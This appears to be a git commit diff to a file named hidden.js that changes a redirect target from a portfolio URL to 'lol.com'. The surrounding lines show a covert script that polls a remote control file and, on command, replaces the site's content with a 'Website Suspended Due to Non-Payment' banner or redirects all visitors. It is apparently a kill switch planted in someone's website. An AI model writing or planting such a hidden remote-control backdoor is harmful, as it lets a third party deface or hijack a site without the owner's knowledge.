49f924d863d3c3d41125a01fe1dede9904c9ae5f
creora <syedd12141@gmail.com>
2025-03-17 01:10:27 +0500

    hidden.js

--- hidden.js
+++ hidden.js
@@ -5,6 +5,6 @@ fetch('https://your-server.com/control.txt')
       document.body.innerHTML = "<h1>Website Suspended Due to Non-Payment</h1>";
       document.body.style.backgroundColor = "black";
     } else if (command.trim() === "redirect") {
-      window.location.href = "https://your-portfolio.com";
+      window.location.href = "https://lol.com";
     }
   });
